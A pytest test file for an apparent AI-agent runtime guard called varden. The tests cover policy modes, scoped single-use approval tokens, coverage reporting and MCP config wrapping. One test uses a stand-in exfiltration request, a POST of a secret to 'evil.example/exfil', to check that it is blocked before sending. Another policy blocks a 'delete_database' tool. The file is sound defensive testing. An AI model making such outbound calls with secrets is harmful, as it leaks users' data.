"""Runtime boundary core, approvals, coverage, and one-line protect invariants."""

from __future__ import annotations

import json
from pathlib import Path
from tempfile import TemporaryDirectory

import pytest
from fastapi.testclient import TestClient

import varden
from varden.app_factory import create_app
from varden.config import AppConfig
from varden.runtime.approvals import ApprovalStore, hash_action_scope
from varden.runtime.coverage import ENFORCED, PARTIAL, get_coverage_registry
from varden.runtime.modes import is_enforcing, normalize_mode


def make_client(tmpdir: str, policy: dict | None = None):
    policy_path = Path(tmpdir) / "policy.json"
    doc = policy or {
        "block": [{"type": "tool_call", "tool": "delete_database"}],
        "require_approval": [{"type": "tool_call", "tool": "needs_approval"}],
        "warn": [],
        "monitor": [],
        "allow": [],
    }
    policy_path.write_text(json.dumps(doc), encoding="utf-8")
    cfg = AppConfig(
        env="dev",
        db_path=str(Path(tmpdir) / "varden.db"),
        auth_db_path=str(Path(tmpdir) / "varden_auth.db"),
        policy_file=str(policy_path),
        signing_secret="dev-secret",
        rate_limit_per_minute=5000,
    )
    app = create_app(cfg)
    return TestClient(app)


def test_normalize_mode_aliases():
    assert normalize_mode("enforce") == "guarded"
    assert normalize_mode("monitor") == "observe"
    assert normalize_mode("strict") == "strict"
    assert is_enforcing("guarded")
    assert is_enforcing("strict")
    assert not is_enforcing("observe")


def test_protect_one_line_default_is_enforcing():
    """Invariant 10: one-line protect continues to enforce supported surfaces."""
    try:
        guard = varden.protect(
            base_url="http://127.0.0.1:9",
            api_key="x",
            fail_mode="open",
            emit_attestation=False,
        )
        assert guard.product_mode == "guarded"
        assert is_enforcing(guard.product_mode)
        att = get_coverage_registry().attestation()
        statuses = {c["category"]: c["status"] for c in att["categories"]}
        assert statuses.get("subprocess") == ENFORCED
        assert statuses.get("filesystem") == PARTIAL
        assert "http" in statuses
    finally:
        varden.unpatch_runtime()


def test_strict_refuses_fail_open():
    with pytest.raises(ValueError):
        varden.protect(mode="strict", fail_mode="open", auto_instrument=False, emit_attestation=False)


def test_strict_missing_coverage_fails_startup():
    with pytest.raises(RuntimeError, match="strict mode not ready|required coverage missing|discovered"):
        varden.protect(
            mode="strict",
            auto_instrument=False,
            emit_attestation=False,
            require_coverage=["mcp"],
        )


def test_coverage_endpoint():
    with TemporaryDirectory() as tmpdir:
        client = make_client(tmpdir)
        key = client.get("/health").json()["bootstrap_api_key"]
        r = client.get("/runtime/coverage", headers={"x-api-key": key})
        assert r.status_code == 200
        body = r.json()
        assert "live" in body
        assert "note" in body


def test_approval_issue_retry_consume_replay():
    """Invariants 2–4: approval required, scoped, single-use."""
    with TemporaryDirectory() as tmpdir:
        client = make_client(tmpdir)
        key = client.get("/health").json()["bootstrap_api_key"]
        headers = {"x-api-key": key}
        action = {
            "type": "tool_call",
            "tool": "needs_approval",
            "args": {"target": "prod"},
            "trace_id": "approval-trace-1",
            "agent_name": "approval-agent",
        }
        first = client.post("/sdk/guard", headers=headers, json={"action": action, "payload": action["args"]})
        assert first.status_code == 403
        detail = first.json()["detail"]
        assert detail["decision"]["action"] == "require_approval"
        approval_id = detail["approval_id"]
        assert approval_id

        pending = client.get("/approvals/pending", headers=headers)
        assert pending.status_code == 200
        assert any(i["approval_id"] == approval_id for i in pending.json()["items"])

        approved = client.post(f"/approvals/{approval_id}/approve", headers=headers)
        assert approved.status_code == 200
        token = approved.json()["token"]
        assert token

        retry_action = {
            **action,
            "metadata": {"approval_token": token, "runtime": {"surface": "tools", "boundary": True}},
        }
        second = client.post("/sdk/guard", headers=headers, json={"action": retry_action, "payload": action["args"]})
        assert second.status_code == 200
        assert second.json()["decision"]["action"] == "allow"

        # Replay must fail.
        third = client.post("/sdk/guard", headers=headers, json={"action": retry_action, "payload": action["args"]})
        assert third.status_code == 403

        # Scope mismatch: different resource.
        store = ApprovalStore(str(Path(tmpdir) / "varden.db"), signing_secret="dev-secret")
        other = {
            "type": "tool_call",
            "tool": "needs_approval",
            "args": {"target": "other"},
            "trace_id": "approval-trace-1",
        }
        pending2 = client.post("/sdk/guard", headers=headers, json={"action": other, "payload": other["args"]})
        assert pending2.status_code == 403
        aid2 = pending2.json()["detail"]["approval_id"]
        tok2 = client.post(f"/approvals/{aid2}/approve", headers=headers).json()["token"]
        mismatched = {
            **other,
            "args": {"target": "prod"},
            "metadata": {"approval_token": tok2},
        }
        bad = client.post("/sdk/guard", headers=headers, json={"action": mismatched, "payload": mismatched["args"]})
        assert bad.status_code == 403


def test_client_cannot_forge_approval_flag():
    with TemporaryDirectory() as tmpdir:
        client = make_client(tmpdir)
        key = client.get("/health").json()["bootstrap_api_key"]
        action = {
            "type": "tool_call",
            "tool": "needs_approval",
            "args": {},
            "metadata": {"approved": True},
        }
        r = client.post("/sdk/guard", headers={"x-api-key": key}, json={"action": action, "payload": {}})
        assert r.status_code == 403


def test_blocked_http_never_sends_body():
    """Invariant 1: blocked pre-execution cannot invoke side effect."""
    from tests.runtime.helpers import make_app_client, wire_guard_to_app

    with TemporaryDirectory() as tmpdir:
        policy = {
            "block": [{"type": "http_request", "method": "POST", "field:url": {"contains": "evil.example"}}],
            "warn": [],
            "monitor": [],
            "allow": [],
        }
        client, app = make_app_client(tmpdir, policy=policy)
        key = client.get("/health").json()["bootstrap_api_key"]
        sent = {"called": False}
        try:
            guard = varden.protect(base_url="http://testserver", api_key=key, emit_attestation=False)
            wire_guard_to_app(guard, client)
            with pytest.raises(varden.VardenBlockedError):
                guard.guarded_action(
                    type="http_request",
                    tool="requests",
                    url="https://evil.example/exfil",
                    method="POST",
                    args={"body": {"secret": "x"}},
                    payload={"secret": "x"},
                    metadata={"runtime": {"surface": "http", "boundary": True}},
                )
            assert sent["called"] is False
        finally:
            varden.unpatch_runtime()


def test_mcp_config_wrap_is_non_destructive():
    from varden.runtime.mcp_gateway import wrap_mcp_config

    cfg = {
        "mcpServers": {
            "public-search": {"command": "python", "args": ["-m", "demo_server"]},
        }
    }
    wrapped, changes = wrap_mcp_config(cfg)
    assert changes[0]["change"] == "wrapped"
    assert wrapped["mcpServers"]["public-search"]["args"][1] == "varden.runtime.mcp_gateway"
    # Original untouched
    assert cfg["mcpServers"]["public-search"]["command"] == "python"


def test_hash_action_scope_stable():
    a = {"type": "tool_call", "tool": "x", "args": {"a": 1}, "url": None, "method": None}
    h1 = hash_action_scope(action=a)
    h2 = hash_action_scope(action=a)
    assert h1 == h2
